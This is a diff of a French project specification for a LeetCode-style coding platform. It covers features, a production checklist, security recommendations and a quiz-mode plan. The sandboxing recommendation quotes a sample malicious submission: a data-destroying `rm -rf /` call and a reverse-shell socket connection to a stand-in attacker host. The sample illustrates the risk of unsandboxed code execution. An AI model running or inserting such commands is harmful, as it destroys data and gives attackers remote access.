@@ -27,7 +27,7 @@
 
 CloudCode est une **plateforme de coding compétitif** style LeetCode, avec :
 
-- **Challenges de code** : 51 challenges en mode fonction (Python + JavaScript), testés automatiquement
+- **Challenges de code** : 55 challenges en mode fonction (Python + JavaScript), testés automatiquement
 - **Mode VS** : 1v1 en temps réel avec système ELO
 - **Cours** : Parcours d'apprentissage guidé
 - **Classement** : Leaderboard global et par challenge
@@ -243,6 +243,7 @@ GitCredentials
 | `20260310051932_AddStreakAndOfficialSolution` | Streak (ChallengeStreak, BestChallengeStreak, LastChallengeSolvedDate) sur User + OfficialSolutionPython/JS + Hints sur Challenge |
 | `20260310130000_AddFirebaseUid` | Colonne `FirebaseUid` (nullable) sur Users + index unique |
 | `20260310200000_AddPasswordReset` | Colonnes `PasswordResetToken` + `PasswordResetTokenExpiry` (nullable) sur Users |
+| `20260311100000_AddChallengeComments` | Table `ChallengeComments` (Id, ChallengeId, UserId, Content, ParentId?, CreatedAt) avec FK cascade |
 
 ---
 
@@ -530,11 +531,11 @@ Persisté dans `localStorage` (accessToken, refreshToken).
 
 ### ✅ Challenges (COMPLET)
 
-- 51 challenges en base de données, tous publiés
+- **55 challenges** en base de données, tous publiés (31 Easy, 17 Medium, 7 Hard)
 - Format fonction LeetCode : l'user écrit uniquement la fonction
 - Python + JavaScript supportés (la plupart supportent les deux)
 - Test cases visibles (exemples) + cachés (soumission complète)
-- 259 test cases vérifiés et fonctionnels
+- **259 test cases** vérifiés et fonctionnels
 - Score par soumission
 - Historique des soumissions (clic pour recharger le code)
 - Timer de résolution
@@ -550,16 +551,34 @@ Persisté dans `localStorage` (accessToken, refreshToken).
 
 | Catégorie | Challenges |
 |---|---|
-| Arrays | Two Sum, Max Subarray, Move Zeros, Remove Duplicates, Array Intersection, Rotate Array, Find Missing, Single Number |
-| Strings | Reverse String, Palindrome Check, Anagram Check, Count Vowels, Caesar Cipher, Longest Common Prefix, Count Char, First Non-Repeating |
-| Math | Fibonacci, Factorial, Prime Number, FizzBuzz, Power of Two |
-| Sorting | Bubble Sort, Merge Sort |
-| Dynamic Programming | Climbing Stairs, Coin Change, Edit Distance, Longest Common Subsequence, Min Path Sum, Knapsack, Max Product Subarray |
-| Linked Lists | Reverse Linked List, Detect Cycle |
-| Trees/Graphs | Binary Search, BFS, DFS, Valid BST, Tree Height |
-| Stack/Queue | Valid Parentheses, Min Stack |
-| Hashing | Group Anagrams, Top K Elements |
-| Miscellaneous | Even/Odd Check, Sum of Digits |
+| Arrays | Two Sum, Max Subarray, Remove Duplicates, Array Intersection, Rotate Array, Missing Number, Contains Duplicate, Majority Element, Product Except Self, Merge Sorted Arrays |
+| Strings | Reverse String, Palindrome, Anagram, Count Vowels, Longest Common Prefix, Capitalize Words, String Length, Roman to Integer, Longest Substring No Repeat, Min Window Substring |
+| Math | Fibonacci, Factorial, FizzBuzz, Power, Sum of Digits, Find GCD, Is Even |
+| Dynamic Programming | Climbing Stairs, Coin Change, Unique Paths, Jump Game, Longest Increasing Subsequence, Edit Distance |
+| Two Pointers / Sliding Window | Max Subarray, Container Most Water, Three Sum, Trapping Rain Water |
+| Matrix | Spiral Matrix, Valid Sudoku, Word Search |
+| Linked Lists | Linked List Cycle Detection |
+| Trees / BFS | Tree Depth (Serialize Binary Tree) |
+| Hashing | Group Anagrams, LRU Cache |
+| Backtracking | N-Queens |
+| Scheduling | Job Scheduling |
+| Binary Search | Binary Search, Median Two Sorted Arrays |
+| Miscellaneous | Valid Parentheses, Flatten List, Max Element |
+
+### ✅ Quiz Mode (COMPLET)
+
+- **Quiz Solo** (`/quiz`) — QCM, 10 questions, 30 secondes par question, score à la fin
+- 5 catégories : Python, JavaScript, Algorithms, Data Structures, General CS
+- 3 niveaux : Easy, Medium, Hard
+- 30 questions en base (6 par catégorie), seeder automatique
+- Révèle la bonne réponse + explication après chaque question
+- Historique des sessions
+- **Quiz VS** (`/quiz/vs`) — 1v1 temps réel via SignalR
+- Matchmaking par catégorie + difficulté
+- Premier correct = 2 pts, les deux corrects = 1 pt chacun
+- 10 questions simultanées, résultat question par question
+- Système ELO (K=32) + tiers identiques au VS Code
+- Leaderboard compétitif
 
 ### ✅ VS Mode (COMPLET)
 
@@ -606,17 +625,17 @@ Persisté dans `localStorage` (accessToken, refreshToken).
 - Perfect scores (100%)
 - Filtres par période (all, week, month)
 
-### ✅ Projets & IDE (PARTIELLEMENT)
+### ✅ Discussion par challenge (COMPLET)
 
-- Créer/modifier/supprimer des projets
-- Éditeur Monaco avec arborescence de fichiers
-- Exécution de code (run)
-- Collaboration en temps réel (SignalR)
-- Téléchargement en ZIP
-- Variables d'environnement
-- Gestion des dépendances
-- Git intégré (init, commit, push, pull)
-- Formatage du code (black, prettier, gofmt, rustfmt)
+- Interface chat style iMessage/WhatsApp sous chaque challenge
+- Messages envoyés (droite, dégradé violet) vs reçus (gauche, verre sombre)
+- Couleurs d'avatar uniques par utilisateur (palette de 8 couleurs, hash-based)
+- Indicateur de frappe animé (3 points qui rebondissent)
+- Auto-scroll vers le dernier message
+- Réponses imbriquées (1 niveau de thread)
+- Badge d'unread count sur l'onglet Discussion
+- Suppression de commentaire (auteur ou admin)
+- Backend : `ChallengeCommentsController` avec `GET/POST/DELETE /api/challenges/{slug}/comments`
 
 ### ✅ Page Profil (COMPLET)
 
@@ -647,70 +666,410 @@ Persisté dans `localStorage` (accessToken, refreshToken).
 
 - Tableau de bord challenges : créer, modifier, publier, supprimer
 - Tableau de bord cours : idem
-- Gestion utilisateurs : liste, donner/retirer les droits admin, **supprimer un user** (suppression en cascade de toutes ses données)
+- Gestion utilisateurs : liste, donner/retirer les droits admin, **supprimer un user** (suppression en cascade via EF Core RemoveRange — VsMatches via raw SQL car colonne manquante en DB)
 - Dashboard `/admin` : KPIs (users, soumissions, challenges, VS matches), graphique 14 jours, top challenges
 - Seeder : relancer l'injection des challenges depuis l'API
 
+### ✅ Logging (COMPLET)
+
+- `[Auth]` : chaque action register/login/logout/firebase/refresh loggée avec `Console.WriteLine`
+- `[Comments]` : GET/POST/DELETE commentaires avec slug, userId, résultat
+- `[DeleteUser]` : suppression user step-by-step (comments, submissions, progress, VS, projects, user)
+
 ---
 
-## 9. Fonctionnalités manquantes / À faire
+## 9. Ce qui reste à faire pour une app 100% fonctionnelle
 
-### 🔴 Priorité haute — Produit
+> Mise à jour : mars 2026 — après implémentation du système Premium Stripe complet.
 
-| Feature | Description | Complexité | Lié monétisation |
+---
+
+### ✅ Fonctionnalités implémentées (état actuel)
+
+| Catégorie | Détail |
+|---|---|
+| **Challenges** | 51 challenges (Easy/Medium/Hard), mode fonction, Python + JS, hints, solution officielle, streak, challenge du jour, leaderboard |
+| **VS Mode** | Matchmaking ELO temps réel, SignalR, historique, classement |
+| **Quiz** | Solo (10 questions, timer, score) + VS 1v1 (SignalR, 5 questions) |
+| **Cours** | Parcours Python + JS avec leçons et exercices |
+| **Premium / Stripe** | Checkout Session, webhooks, annulation, gating Courses/Quiz/VS/Hard challenges |
+| **Profil** | Stats, heatmap, badges, profil public `/u/{username}` |
+| **Auth** | Email/password, Google Sign-In (Firebase), reset password, email vérification |
+| **Admin** | Panel admin, CRUD challenges, gestion users, stats globales |
+| **Sécurité** | Rate limiting, CORS, validation DTOs, JWT rotation |
+
+---
+
+### 🔴 À faire — Critique (app incomplète sans ça)
+
+| # | Quoi | Où | Effort |
 |---|---|---|---|
-| ~~**Page Profil utilisateur**~~ | ✅ Implémenté — `/profile` avec stats complètes | — | — |
-| ~~**Streak journalier**~~ | ✅ Implémenté — champs `ChallengeStreak` + `BestChallengeStreak` sur User, calculé dans JudgeService | — | — |
-| ~~**Solution officielle**~~ | ✅ Implémenté — tab "Solution" visible après résolution (score 100), Python + JS | — | — |
-| ~~**Hints / indices**~~ | ✅ Implémenté — débloquables un par un dans l'onglet Description | — | — |
-| ~~**Challenge aléatoire**~~ | ✅ Implémenté — bouton Random dans la liste, respecte les filtres actifs | — | — |
-| ~~**Email de vérification**~~ | ✅ Implémenté — Firebase Auth envoie l'email automatiquement à l'inscription | — | — |
-| ~~**Reset de mot de passe**~~ | ✅ Implémenté — flow natif token DB (pages `/forgot-password` + `/reset-password`), email via Resend | — | — |
-| ~~**Google Sign-In**~~ | ✅ Implémenté — Firebase signInWithPopup, username auto-dérivé, bouton sur login + register | — | — |
-| **Rate limiting soumissions** | Max X soumissions/minute pour éviter l'abus | Faible | Oui — free vs premium |
-| **Challenge aléatoire** | Bouton "Random" sur `/challenges` filtré par difficulté | Très faible | Non |
+| 1 | **Badge Premium + bouton annuler** sur `/profile` | `frontend/src/app/profile/page.tsx` | 1h |
+| 2 | **Toggle premium admin** dans le panel admin (activer/désactiver pour un user) | `AdminUsersController` + page admin | 2h |
+| 3 | **Appliquer la migration** `AddPremiumToUsers` sur la DB de prod | `dotnet ef database update` | 5min |
+| 4 | **Vérifier domaine Resend** (DNS) pour envoyer des emails à n'importe qui | resend.com → Domains | 30min |
+| 5 | **Secrets hors du code** — JWT, Resend, Stripe dans variables d'env | `appsettings.json` → env vars | 1h |
 
-### 🟡 Priorité moyenne — Engagement
+---
 
-| Feature | Description | Complexité |
+### 🟡 À faire — Important pour le lancement
+
+| # | Quoi | Détail | Effort |
+|---|---|---|---|
+| 6 | **Hébergement public** | Railway (backend .NET + DB) + Vercel (frontend) | 2–4h |
+| 7 | **Domaine custom** | Acheter sur Namecheap/Cloudflare, configurer DNS | 1h |
+| 8 | **HTTPS** | Obligatoire pour Stripe. Inclus sur Railway/Vercel | Automatique |
+| 9 | **Stripe live keys** | Remplacer les clés test par les clés live + configurer webhook prod | 30min |
+| 10 | **`App:FrontendUrl`** en prod | Mettre l'URL réelle du frontend (ex: `https://cloudcode.io`) | 5min |
+| 11 | **Sandboxer l'exécution de code** | Docker par soumission (réseau off, timeout, mémoire limitée) — risque sécurité | 1–2 jours |
+
+---
+
+### 🟢 À faire — Nice-to-have (après lancement)
+
+| # | Quoi | Détail |
 |---|---|---|
-| ~~**Graphique de progression**~~ | ✅ Implémenté — Heatmap GitHub-style sur `/profile`, 365 cases colorées par intensité | — |
-| **Notifications email** | Email si streak en danger, nouveau challenge, résultat VS | Moyenne |
-| ~~**Pagination leaderboard**~~ | ✅ Implémenté — 20 par page, boutons Prev/Next + numéros avec ellipsis | — |
-| **Discussion par challenge** | Commentaires / forum sous chaque challenge | Haute |
-| ~~**Partage challenge**~~ | ✅ Implémenté — bouton Share dans l'onglet Description | — |
-| ~~**Challenge du jour**~~ | ✅ Implémenté — banner avec countdown, hash déterministe | — |
-| ~~**Profil public**~~ | ✅ Implémenté — `/u/{username}` avec stats complètes | — |
-| ~~**Admin — Statistiques globales**~~ | ✅ Implémenté — `/admin` dashboard : KPIs, graphique 14 jours, top challenges, raccourcis | — |
+| 12 | **Notifications email** | Streak en danger, résultat VS, nouveau challenge |
+| 13 | **PostgreSQL** | Remplacer SQLite (concurrent writes en prod) |
+| 14 | **Tests automatisés** | xUnit backend + Jest/Playwright frontend |
+| 15 | **Backup DB automatique** | Cron SQLite → S3 ou fichier local |
+| 16 | **Contests / compétitions** | Challenge avec deadline + classement temporaire |
+| 17 | **JWT httpOnly cookie** | Sécurité XSS (actuellement localStorage) |
 
-### 🟢 Priorité basse / Nice-to-have
+---
 
-| Feature | Description | Complexité |
-|---|---|---|
-| ~~**Badges et achievements**~~ | ✅ Implémenté — 16 badges calculés côté frontend depuis les stats existantes (common/rare/epic/legendary), section sur `/profile` | — |
-| **Boutique avatars / thèmes** | Items cosmétiques achetables (lié monétisation) | Haute |
-| **Contests** | Compétitions avec deadline et classement | Haute |
-| **Support Java / C++ / Go** | Ajouter langages aux challenges | Haute |
-| **Éditeur collaboratif** | Pair programming sur challenge | Haute |
-| **Certifications payantes** | Badge certifié CloudCode après examen | Haute |
-| **Mobile app** | React Native | Très haute |
+### 🚀 Checklist mise en production (dans l'ordre)
 
-### 🔧 Dette technique — À régler avant production
+```
+□ 1. Vérifier domaine sur Resend (DNS TXT)
+□ 2. Créer compte Railway → déployer backend .NET
+□ 3. Créer DB PostgreSQL sur Railway (ou garder SQLite au début)
+□ 4. Appliquer toutes les migrations EF Core sur la DB prod
+□ 5. Configurer variables d'environnement sur Railway :
+      Jwt__SecretKey=<32+ chars aléatoires>
+      Resend__ApiKey=re_xxx
+      Stripe__SecretKey=sk_live_xxx
+      Stripe__PriceId=price_xxx
+      Stripe__WebhookSecret=whsec_xxx
+      App__FrontendUrl=https://ton-domaine.com
+□ 6. Déployer frontend sur Vercel → connecter au backend Railway
+□ 7. Configurer domaine custom sur Railway + Vercel
+□ 8. Créer webhook Stripe prod → URL : https://api.ton-domaine.com/api/premium/webhook
+□ 9. Tester checkout complet avec carte live $0,50
+□ 10. Activer HSTS dans Program.cs
+```
+
+---
+
+### 🔧 Dette technique existante
 
 | Problème | Impact | Solution |
 |---|---|---|
-| **SQLite en production** | Corruption possible en concurrence | Migrer vers PostgreSQL |
-| **Exécution code non sandboxée** | Risque sécurité (code malveillant) | Docker par exécution |
-| ~~**Pas de rate limiting**~~ | ✅ Implémenté — sliding window 15/min (submit) + 30/min (test) | — |
-| **JWT dans localStorage** | XSS vulnérabilité | httpOnly cookie |
-| **Pas de tests automatisés** | Régressions difficiles à détecter | xUnit (backend) + Jest (frontend) |
-| **Resend plan gratuit** | En prod, emails envoyables uniquement à l'email du compte Resend. Vérifier un domaine sur Resend (DNS) pour envoyer à tous | Vérifier domaine sur resend.com |
-| **Logs en console uniquement** | Difficile à déboguer en prod | Serilog + fichier / Datadog |
-| **Pas de backup DB** | Perte données possible | Cron backup SQLite → S3 ou local |
+| **Exécution code non sandboxée** | Risque sécurité critique | Docker par exécution |
+| **JWT dans localStorage** | Vulnérabilité XSS | Migrer vers httpOnly cookies |
+| **SQLite en production** | Corruption si trafic concurrent | Migrer vers PostgreSQL |
+| **Pas de tests automatisés** | Régressions difficiles à détecter | xUnit + Jest |
+| **Pas de backup DB** | Perte de données possible | Cron backup → S3 |
+
+### ✅ Sécurité implémentée (mars 2026)
+
+| Mesure | Détail |
+|---|---|
+| **Rate limiting auth** | Login : 10/min · Register : 5/min · ForgotPassword : 3/5min · Refresh : 20/min |
+| **Rate limiting code** | Submit : 15/min · Test : 30/min · Comments : 10/min |
+| **CORS restrictif** | Méthodes explicites (GET/POST/PUT/DELETE) · Headers explicites (Authorization/Content-Type) |
+| **Validation DTOs** | `[Required]` `[EmailAddress]` `[StringLength]` `[RegularExpression]` sur Register, Login, Reset, Change password |
+| **Username format** | Regex `^[a-zA-Z0-9_\-]+$` · 3–30 chars · validé côté serveur |
+| **XSS comments** | Strip des balises HTML avant stockage en base |
+| **Body size limit** | 1 MB global via Kestrel |
+| **Admin policy** | `[Authorize(Policy = "AdminOnly")]` sur tous les endpoints admin |
+| **SQL injection** | Requêtes LINQ uniquement (EF Core) · `ExecuteSqlInterpolatedAsync` paramétré pour VsMatches |
+| **JWT validation** | Issuer + Audience + Lifetime + Signing key validés · ClockSkew = 0 |
+| **Refresh token rotation** | Nouveau token à chaque refresh · Invalidation à la déconnexion |
+
+### 🔴 Recommandations de sécurité — À implémenter avant mise en production
+
+#### Priorité 1 — CRITIQUE (bloquerait la mise en prod)
+
+**1. Déplacer tous les secrets hors du code**
+
+Les secrets suivants sont actuellement dans `appsettings.json` (fichier versionné) :
+- `Jwt:SecretKey` → clé de signature JWT — si compromise, n'importe qui peut forger des tokens admin
+- `Resend:ApiKey` → clé API email exposée dans Git
+
+**Solution :** utiliser des variables d'environnement ou un secrets manager (Azure Key Vault, AWS Secrets Manager, ou simplement `.env` non commité).
+
+```bash
+# Exemple : remplacer dans appsettings.json par des placeholders
+"Jwt": { "SecretKey": "" }
+"Resend": { "ApiKey": "" }
+
+# Et définir en variable d'environnement au démarrage :
+export Jwt__SecretKey="ma_vraie_cle_tres_longue_et_aleatoire"
+export Resend__ApiKey="re_xxxxx"
+```
+
+La clé JWT doit faire **au moins 32 caractères aléatoires** (pas un texte lisible).
 
 ---
 
-## 10. Plan de monétisation
+**2. JWT dans localStorage → migrer vers httpOnly cookies**
+
+Actuellement (`frontend/src/stores/authStore.ts`) :
+```typescript
+localStorage.setItem('accessToken', accessToken);  // ← XSS vuln
+```
+
+N'importe quel script injecté (XSS, extension malveillante, CDN compromis) peut lire ce token et usurper l'identité de l'utilisateur.
+
+**Solution :** stocker le token dans un cookie `httpOnly; Secure; SameSite=Strict`.
+
+Backend — retourner le token en cookie plutôt que dans le body :
+```csharp
+Response.Cookies.Append("accessToken", accessToken, new CookieOptions {
+    HttpOnly = true,
+    Secure = true,
+    SameSite = SameSiteMode.Strict,
+    Expires = DateTimeOffset.UtcNow.AddMinutes(60)
+});
+```
+
+Frontend — supprimer tout `localStorage.setItem/getItem` pour les tokens, et envoyer les requêtes avec `credentials: 'include'`.
+
+---
+
+#### Priorité 2 — HAUTE (risque opérationnel sérieux)
+
+**3. Sandboxer l'exécution de code utilisateur**
+
+`JudgeService.cs` exécute directement `python` et `node` sur le serveur sans isolation. Un utilisateur peut soumettre :
+```python
+import os; os.system("rm -rf /")
+import socket; socket.connect(("attacker.com", 4444))  # reverse shell
+```
+
+**Solution :** exécuter chaque soumission dans un conteneur Docker éphémère avec :
+- Réseau désactivé (`--network none`)
+- Filesystem read-only sauf `/tmp`
+- CPU et mémoire limités (`--cpus 0.5 --memory 128m`)
+- Timeout strict (`--stop-timeout 10`)
+
+```bash
+docker run --rm --network none --read-only --memory 128m --cpus 0.5 \
+  --tmpfs /tmp python:3.11-slim python /tmp/solution.py
+```
+
+---
+
+**4. HSTS (HTTP Strict Transport Security)**
+
+Ajoute ce header pour forcer HTTPS sur tous les navigateurs qui ont déjà visité le site :
+```csharp
+// Dans Program.cs, après app.UseHttpsRedirection()
+app.UseHsts();  // ou configurer manuellement :
+// Response.Headers.Add("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
+```
+
+---
+
+**5. Headers de sécurité HTTP**
+
+Ajouter un middleware pour les headers de sécurité essentiels :
+```csharp
+app.Use(async (context, next) =>
+{
+    context.Response.Headers.Append("X-Content-Type-Options", "nosniff");
+    context.Response.Headers.Append("X-Frame-Options", "DENY");
+    context.Response.Headers.Append("Referrer-Policy", "strict-origin-when-cross-origin");
+    context.Response.Headers.Append("Permissions-Policy", "camera=(), microphone=(), geolocation=()");
+    await next();
+});
+```
+
+---
+
+#### Priorité 3 — MOYENNE (bonne hygiène)
+
+**6. Confirmation d'email à l'inscription**
+
+Actuellement `EmailConfirmed = false` mais n'est jamais vérifié. N'importe qui peut s'inscrire avec l'email de quelqu'un d'autre.
+
+**Solution :**
+- Générer un token de vérification à l'inscription
+- Envoyer un email avec lien `GET /auth/verify-email?token=xxx`
+- Bloquer la connexion tant que `EmailConfirmed = false` (ou au moins afficher un avertissement)
+
+---
+
+**7. Protection des tokens SignalR**
+
+Les tokens JWT passent actuellement en query string pour SignalR (`/hubs/vs?access_token=xxx`). Ces tokens apparaissent dans les logs serveur, l'historique du navigateur et les headers Referer.
+
+**Solution :** utiliser le cookie httpOnly (fix #2) comme transport pour SignalR également — SignalR supporte nativement les cookies.
+
+---
+
+**8. Backup automatique de la base de données**
+
+SQLite stocke tout dans un seul fichier `CloudCode.db`. En cas de crash disque ou erreur de manipulation, toutes les données sont perdues (comme les 26 challenges perdus précédemment).
+
+**Solution :**
+```bash
+# Cron toutes les heures : copie atomique de la DB
+0 * * * * sqlite3 /app/CloudCode.db ".backup '/backups/CloudCode_$(date +\%Y\%m\%d_\%H\%M).db'"
+# Garder 7 jours de backups
+find /backups -name "*.db" -mtime +7 -delete
+```
+
+---
+
+**9. `AllowedHosts` — restreindre en production**
+
+`appsettings.json` : `"AllowedHosts": "*"` → vulnérable aux attaques par Host header injection.
+
+En production, remplacer par le domaine exact :
+```json
+"AllowedHosts": "cloudcode.io;www.cloudcode.io"
+```
+
+---
+
+## 10. Plan — Quiz Mode (Normal + VS)
+
+> Feature à implémenter. Plan complet rédigé le 14 mars 2026.
+
+### Concept
+
+**Quiz Normal** (`/quiz`) — Solo, QCM, 10 questions, 30s par question, score à la fin.
+
+**Quiz VS** (`/quiz/vs`) — 1v1 en temps réel via SignalR, même pool de questions, 20s par question, premier correct = 2 pts, les deux corrects = 1 pt chacun, système ELO.
+
+---
+
+### Fichiers à créer / modifier (ordre d'implémentation)
+
+#### Étape 1 — Domain (entités + enums)
+
+| Fichier | Action | Contenu |
+|---|---|---|
+| `src/CloudCode.Domain/Enums/QuizEnums.cs` | CRÉER | `QuizCategory` (Python=1, JavaScript=2, Algorithms=3, DataStructures=4, GeneralCS=5) · `QuizDifficulty` (Easy/Medium/Hard) · `QuizSessionStatus` (InProgress/Completed/Abandoned) · `QuizVsMatchStatus` (Waiting/InProgress/Finished/Cancelled) |
+| `src/CloudCode.Domain/Entities/QuizQuestion.cs` | CRÉER | Id, Text, OptionA/B/C/D, CorrectOption (0=A…3=D), Category, Difficulty, Explanation?, IsPublished |
+| `src/CloudCode.Domain/Entities/QuizSession.cs` | CRÉER | UserId, Category, Difficulty, Status, Score, TotalQuestions=10, CorrectAnswers, CompletedAt? + nav User + nav Answers |
+| `src/CloudCode.Domain/Entities/QuizSessionAnswer.cs` | CRÉER | SessionId, QuestionId, QuestionIndex (0–9), SelectedOption?, IsCorrect, TimeTakenMs |
+| `src/CloudCode.Domain/Entities/QuizVsMatch.cs` | CRÉER | Player1Id, Player2Id, QuestionIds (JSON list), Status, WinnerId?, Player1/2Score, Player1/2EloChange, CurrentQuestionIndex, Player1/2Finished, StartedAt?, FinishedAt? |
+| `src/CloudCode.Domain/Entities/QuizVsAnswer.cs` | CRÉER | MatchId, PlayerId, QuestionId, QuestionIndex, SelectedOption?, IsCorrect, TimeTakenMs, IsFirst (= 2 pts) |
+| `src/CloudCode.Domain/Entities/QuizRank.cs` | CRÉER | Même structure que `VsRank` : UserId, Elo=1000, Wins, Losses, Draws, CurrentStreak, BestStreak + `GetTier()` |
+
+#### Étape 2 — Infrastructure : EF Core
+
+| Fichier | Action | Contenu |
+|---|---|---|
+| `src/CloudCode.Infrastructure/Data/Configurations/QuizConfiguration.cs` | CRÉER | Fluent config pour les 6 tables : QuizQuestions, QuizSessions, QuizSessionAnswers, QuizVsMatches, QuizVsAnswers, QuizRanks — FKs, indexes, colonnes TEXT pour Guid |
+| `src/CloudCode.Infrastructure/Data/Migrations/20260314120000_AddQuizEntities.cs` | CRÉER | Migration manuelle : `Up()` crée les 6 tables dans l'ordre de dépendance, `Down()` les supprime |
+| `src/CloudCode.Infrastructure/Data/Migrations/20260314120000_AddQuizEntities.Designer.cs` | CRÉER | Stub `[DbContext][Migration]` minimal |
+| `src/CloudCode.Infrastructure/Data/ApplicationDbContext.cs` | MODIFIER | Ajouter 6 DbSet après `VsRanks` : `QuizQuestions, QuizSessions, QuizSessionAnswers, QuizVsMatches, QuizVsAnswers, QuizRanks` |
+
+#### Étape 3 — Application (interfaces + DTOs)
+
+| Fichier | Action | Contenu |
+|---|---|---|
+| `src/CloudCode.Application/DTOs/Quiz/QuizDtos.cs` | CRÉER | `QuizQuestionDto` (sans bonne réponse) · `QuizQuestionRevealDto` (avec CorrectOption + Explanation) · `QuizSessionDto` (avec liste `Questions` pour le frontend) · `QuizSessionAnswerDto` · `QuizRankDto` · `QuizLeaderboardEntryDto` · `QuizVsMatchDto` · `QuizVsPlayerDto` · request DTOs : `StartQuizDto`, `SubmitAnswerDto` · SignalR payloads : `QuizMatchFoundPayload`, `QuizQuestionPayload`, `QuizOpponentAnsweredPayload`, `QuizQuestionResultPayload`, `QuizMatchEndedPayload` |
+| `src/CloudCode.Application/Interfaces/IQuizService.cs` | CRÉER | Solo : `StartSession, SubmitAnswer, GetSession, GetSessionHistory, AbandonSession` · VS : `GetOrCreateRank, GetLeaderboard, CreateVsMatch, GetVsMatch, GetVsMatchHistory, SubmitVsAnswer, BothAnsweredQuestion` · Interface séparée `IQuizMatchmakingService` : `TryEnqueue(userId, category, difficulty)`, `Dequeue`, `IsInQueue`, `QueueSize` |
+
+#### Étape 4 — Infrastructure (services)
+
+| Fichier | Action | Contenu |
+|---|---|---|
+| `src/CloudCode.Infrastructure/Services/QuizMatchState.cs` | CRÉER | Singleton `ConcurrentDictionary` — suit qui a répondu à quelle question par match · `TryRecordAnswer()`, `BothAnswered()`, `CloseQuestion()`, `RemoveMatch()` |
+| `src/CloudCode.Infrastructure/Services/QuizService.cs` | CRÉER | Solo : `StartSessionAsync` → 10 questions aléatoires par catégorie/difficulté, `SubmitAnswerAsync` → évalue, révèle, clôture si dernière question · VS : `CreateVsMatchAsync` → tire 10 questions, sérialise en JSON, `SubmitVsAnswerAsync` → détermine `IsFirst`, attribue 2 pts ou 1 pt, calcul ELO (copie de `VsService.UpdateElo`) |
+| `src/CloudCode.Infrastructure/Services/QuizMatchmakingService.cs` | CRÉER | Singleton, même pattern que `MatchmakingService.cs` · Queue d'entrée `(UserId, Category, Difficulty, JoinedAt)` · Match si même `Category + Difficulty` |
+| `src/CloudCode.Infrastructure/Data/QuizSeeder.cs` | CRÉER | 30 questions (6 par catégorie × 5 catégories, mix Easy/Medium/Hard) · Insère seulement si table vide · Voir liste complète ci-dessous |
+
+#### Étape 5 — API
+
+| Fichier | Action | Contenu |
+|---|---|---|
+| `src/CloudCode.API/Controllers/QuizController.cs` | CRÉER | `[Authorize]` · `POST /api/quiz/sessions` · `GET /api/quiz/sessions/{id}` · `GET /api/quiz/sessions` · `POST /api/quiz/sessions/{id}/answers` · `POST /api/quiz/sessions/{id}/abandon` · `GET /api/quiz/vs/rank` · `GET /api/quiz/vs/rank/{userId}` · `GET /api/quiz/vs/leaderboard [AllowAnonymous]` · `GET /api/quiz/vs/matches` · `GET /api/quiz/vs/matches/{id}` · `POST /api/quiz/vs/matches/{id}/abandon` |
+| `src/CloudCode.API/Hubs/QuizHub.cs` | CRÉER | `[Authorize]` · `JoinQueue(int category, int difficulty)` → matchmaking → `MatchFound` ou `QueueJoined` · `LeaveQueue()` · `JoinMatchRoom(string matchId)` → groupe `quiz-match-{id}` → envoie première question · `SubmitVsAnswer(matchId, questionIndex, selectedOption?, timeTakenMs)` → `OpponentAnswered` aux autres → si les deux ont répondu : `QuestionResult` → 3s delay → question suivante ou `MatchEnded` · `OnDisconnectedAsync` → Dequeue |
+
+#### Étape 6 — DI + Program.cs
+
+| Fichier | Action |
+|---|---|
+| `src/CloudCode.Infrastructure/DependencyInjection.cs` | Ajouter `AddScoped<IQuizService, QuizService>()` · `AddSingleton<IQuizMatchmakingService, QuizMatchmakingService>()` · `AddSingleton<QuizMatchState>()` |
+| `src/CloudCode.API/Program.cs` | Après `ChallengeSeeder` : `await QuizSeeder.SeedQuestionsAsync(app.Services)` · Après `VsHub` : `app.MapHub<QuizHub>("/hubs/quiz")` |
+
+#### Étape 7 — Frontend
+
+| Fichier | Action | Contenu |
+|---|---|---|
+| `frontend/src/types/index.ts` | MODIFIER | Ajouter enums `QuizCategory/Difficulty/SessionStatus/VsMatchStatus` + interfaces `QuizQuestion, QuizQuestionReveal, QuizSession, QuizSessionAnswer, QuizRank, QuizLeaderboardEntry, QuizVsMatch, QuizVsPlayer` + payloads SignalR |
+| `frontend/src/lib/api.ts` | MODIFIER | Ajouter `quizApi` : `startSession, getSession, getSessionHistory, submitAnswer, abandonSession, getMyRank, getRank, getLeaderboard, getVsMatch, getVsHistory, abandonVsMatch` |
+| `frontend/src/app/quiz/page.tsx` | CRÉER | Phase `'select'` → choisir catégorie + difficulté · Phase `'playing'` → question + timer 30s animé + 4 boutons A/B/C/D (touche clavier A/B/C/D) + reveal après réponse · Phase `'finished'` → score X/10, tableau récapitulatif |
+| `frontend/src/app/quiz/vs/page.tsx` | CRÉER | Lobby identique à `/vs/page.tsx` + sélecteur catégorie/difficulté · SignalR `/hubs/quiz` · `MatchFound` → `router.push('/quiz/vs/'+matchId)` |
+| `frontend/src/app/quiz/vs/[matchId]/page.tsx` | CRÉER | Phase `'question'` → question + timer 20s + 4 boutons + badge "Adversaire a répondu" · Phase `'reveal'` → bonne réponse en vert, mauvaise en rouge, points gagnés · Phase `'finished'` → banner Win/Loss/Draw, scores, ELO change |
+| `frontend/src/app/quiz/history/page.tsx` | CRÉER | Liste des sessions solo : date, catégorie, difficulté, score X/10 |
+| `frontend/src/components/Navbar.tsx` | MODIFIER | Ajouter lien "Quiz" à côté de "VS" |
+
+---
+
+### Questions du seeder (30 questions)
+
+#### Python (6)
+1. **Easy** — `len([1, 2, 3])` → **3**
+2. **Easy** — Quel type est immuable ? → **tuple**
+3. **Medium** — Output de `[x**2 for x in range(3)]` → **[0,1,4]**
+4. **Medium** — `*args` permet… → **nombre variable d'arguments positionnels**
+5. **Hard** — Complexité lookup dictionnaire Python → **O(1) average**
+6. **Hard** — `__slots__` dans une classe Python → **restreint les attributs d'instance**
+
+#### JavaScript (6)
+1. **Easy** — `typeof null` → **'object'**
+2. **Easy** — Ajouter à la fin d'un tableau → **push()**
+3. **Medium** — `0.1 + 0.2 === 0.3` → **false**
+4. **Medium** — Opérateur `?.` → **optional chaining**
+5. **Hard** — Différence `==` vs `===` → **=== vérifie type et valeur**
+6. **Hard** — Closure en JS → **fonction avec accès aux variables de sa portée externe**
+
+#### Algorithms (6)
+1. **Easy** — Complexité binary search → **O(log n)**
+2. **Easy** — Pire cas O(n²) → **Bubble Sort**
+3. **Medium** — Structure de données du BFS → **Queue**
+4. **Medium** — Mémoïsation → **cache des résultats d'appels coûteux**
+5. **Hard** — Quicksort cas moyen → **O(n log n)**
+6. **Hard** — Master theorem → **analyse récurrences diviser-pour-régner**
+
+#### Data Structures (6)
+1. **Easy** — Stack : opération d'ajout → **push**
